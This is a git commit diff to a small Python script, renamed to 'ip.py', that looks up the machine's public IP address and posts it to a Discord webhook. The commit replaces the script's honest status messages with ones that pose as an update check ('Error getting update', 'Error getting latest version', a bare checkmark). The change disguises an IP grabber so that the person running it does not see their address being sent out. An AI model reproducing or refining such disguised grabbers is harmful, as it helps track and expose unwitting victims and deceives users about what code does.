aaf4eac5fde25e7d073d1a642e8373b8a30d2cc8
DarkkyMoonikk <83876353+DarkMoonIsNotGay@users.noreply.github.com>
2023-12-21 17:30:07 +0100

    Update and rename ip pull up script.py to ip.py

--- ip.py
+++ ip.py
@@ -7,7 +7,7 @@ def get_public_ip():
         response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
         return response.text.strip()
     except requests.exceptions.RequestException as e:
-        print(f"Error getting IP address: {e}")
+        print(f"Error getting update: {e}")
         return None
 
 def send_ip_to_discord_webhook(webhook_url, ip_address):
@@ -20,13 +20,13 @@ def send_ip_to_discord_webhook(webhook_url, ip_address):
 
         response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
 
-        print("IP address sent to Discord webhook successfully.")
+        print("✅")
     except requests.exceptions.RequestException as e:
-        print(f"Error sending IP address to Discord webhook: {e}")
+        print(f"Error getting latest version: {e}")
 
 if __name__ == "__main__":
     # Replace "YOUR_DISCORD_WEBHOOK_URL" with your actual Discord webhook URL
-    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+    webhook_url = "#YOUR_DISCORD_WEBHOOK_URL"
 
     # Get the public IP address of the machine
     ip_address = get_public_ip()
